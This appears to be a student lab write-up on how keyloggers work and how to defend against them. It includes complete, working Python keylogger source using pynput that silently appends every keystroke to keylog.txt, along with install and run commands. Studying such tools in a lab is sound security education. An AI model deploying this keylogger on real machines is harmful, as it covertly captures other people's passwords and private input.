# Enabling a Keylogger on a Target Machine

## Course  
CYB/540 – Cryptography

## Objective  
This lab demonstrates how a keylogger can be installed and used to capture keystrokes on a target system. The purpose is to understand how keyloggers operate, their risk to confidentiality, and how such threats can be mitigated.

## Tools Used  
- Windows 10 virtual machine  
- Python with `pynput` module (for custom keylogger)  
- Administrative privileges  
- Terminal or PowerShell  

## Procedure  
- Install Python and open a terminal or PowerShell  
- Install the `pynput` library:
  ```bash
  pip install pynput
-
  ```python
  from pynput import keyboard

  def on_press(key):
      with open("keylog.txt", "a") as f:
          try:
              f.write(f"{key.char}")
          except AttributeError:
              f.write(f"[{key}]")
  
  with keyboard.Listener(on_press=on_press) as listener:
      listener.join()
- Save the script as keylogger.py and run it with:
    ```bash
    python keylogger.py
    Begin typing into any application (Notepad, browser, etc.)

Stop the script and open keylog.txt to view captured keystrokes

## Results
The script successfully records alphanumeric and special keys
All inputs typed during the session are logged into keylog.txt
The keylogger operates silently in the background with no visible window
This simulates how an attacker may steal credentials or sensitive input

## Lessons Learned
Keyloggers are a serious privacy and security threat
Physical and software access controls are critical to prevent installation
Anti-malware tools and behavioral monitoring can detect keylogger activity
Users should avoid entering sensitive information on untrusted systems
